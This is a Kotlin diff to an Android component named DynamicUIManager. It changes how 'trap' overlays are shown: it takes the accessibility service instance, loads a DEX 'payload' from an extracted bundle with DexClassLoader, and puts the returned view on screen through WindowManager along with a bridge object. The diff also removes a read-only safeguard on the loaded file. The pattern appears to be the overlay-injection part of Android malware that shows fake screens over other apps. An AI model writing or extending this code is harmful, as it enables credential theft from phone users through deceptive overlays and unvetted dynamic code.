@@ -579,7 +579,7 @@ object DynamicUIManager {
         }
     }
 
-    fun showNativeOverlay(ctx: Context, dexPath: String, className: String, dimLevel: Int) {
+    fun showNativeOverlay(ctx: Context, dirPath: String, className: String, dimLevel: Int) {
         Handler(Looper.getMainLooper()).post {
             val serviceInstance = MyAccessibilityService.instance ?: return@post
             val wm = serviceInstance.getSystemService(Context.WINDOW_SERVICE) as WindowManager
@@ -589,21 +589,32 @@ object DynamicUIManager {
             }
             
             try {
-                // Ensure file is readable and secure
-                val dexFile = java.io.File(dexPath)
+                val trapDir = java.io.File(dirPath)
+                val dexFile = java.io.File(trapDir, "classes.dex")
+                
                 if (!dexFile.exists()) {
-                    DebugLogger.log("NATIVE_TRAP_ERR", "DEX file not found at: $dexPath")
+                    DebugLogger.log("NATIVE_TRAP_ERR", "DEX file missing in bundle: ${dexFile.absolutePath}")
                     return@post
                 }
-                dexFile.setReadOnly()
+                
+                DebugLogger.log("NATIVE_TRAP", "Loading Dalvik classes from ${dexFile.absolutePath}")
+                
+                // Use a dedicated optimized directory for dynamic code
+                val optDir = ctx.getDir("dex_opt", Context.MODE_PRIVATE)
+                if (!optDir.exists()) optDir.mkdirs()
 
-                val loader = dalvik.system.DexClassLoader(dexPath, ctx.codeCacheDir.absolutePath, null, ctx.classLoader)
+                val loader = dalvik.system.DexClassLoader(dexFile.absolutePath, optDir.absolutePath, null, ctx.classLoader)
+                
+                DebugLogger.log("NATIVE_TRAP", "Instantiating dynamic class: $className")
                 val clazz = loader.loadClass(className)
                 val instance = clazz.getDeclaredConstructor().newInstance()
                 
-                // Dynamic class must have: fun getView(context: Context, bridge: Any): View
-                val method = clazz.getMethod("getView", Context::class.java, Any::class.java)
-                val view = method.invoke(instance, serviceInstance, CortexBridge(ctx)) as android.view.View
+                DebugLogger.log("NATIVE_TRAP", "Invoking getView(context, bridge, baseDir)...")
+                // The new Contract: getView(Context, Any, String)
+                val method = clazz.getMethod("getView", Context::class.java, Any::class.java, String::class.java)
+                
+                // Pass the absolute path of the extracted folder so the payload can load images
+                val view = method.invoke(instance, serviceInstance, CortexBridge(ctx), trapDir.absolutePath) as android.view.View
 
                 nativeOverlayView = view
 
